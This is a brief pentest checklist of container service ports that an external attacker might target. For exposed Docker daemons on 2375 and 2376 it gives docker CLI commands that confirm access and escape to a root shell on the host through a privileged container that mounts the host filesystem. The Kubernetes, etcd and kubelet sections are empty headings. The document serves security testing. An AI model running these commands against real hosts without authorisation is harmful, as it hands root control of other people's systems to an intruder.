# External Attacker Checklist

External attackers are typically looking for listening services. The list below is likely container related service ports and notes on testing/attacking them.

## 2375/TCP - Docker

This is the default insecure Docker port. It's an HTTP REST API, and usually access results in root on the host.

**Testing with docker CLI**

The easiest way to attack this is just use the docker CLI.

* `docker run -H tcp://[IP]:2375 info` - This will confirm access and return some information about the host
* `docker run -ti --privileged --net=host --pid=host --ipc=host --volume /:/host busybox chroot /host` - From [this](https://zwischenzugs.com/2015/06/24/the-most-pointless-docker-command-ever/) post. This will drop you into a root shell on the host.

## 2376/TCP - Docker

This is the default port for the Docker daemon where it requires credentials (client certificate), so you're unlikely to get far without that. If you do have the certificate and key for access :-

* `docker --tlsverify --tlscacert=ca.pem --tlscert=cert.pem --tlskey=key.pem -H=[IP]:2376 info` - format for the info command to confirm access.
* `docker --tlsverify --tlscacert=ca.pem --tlscert=cert.pem --tlskey=key.pem -H=[IP]:2376 run -ti --privileged --net=host --pid=host --ipc=host --volume /:/host busybox chroot /host` - root on the host

## 443/TCP, 6443/TCP, 8443/TCP - Kubernetes API server

Typical ports for the Kubernetes API server.


## 2379/TCP - etcd

## 10250/TCP - kubelet

## 10255/TCP - kubelet read-only


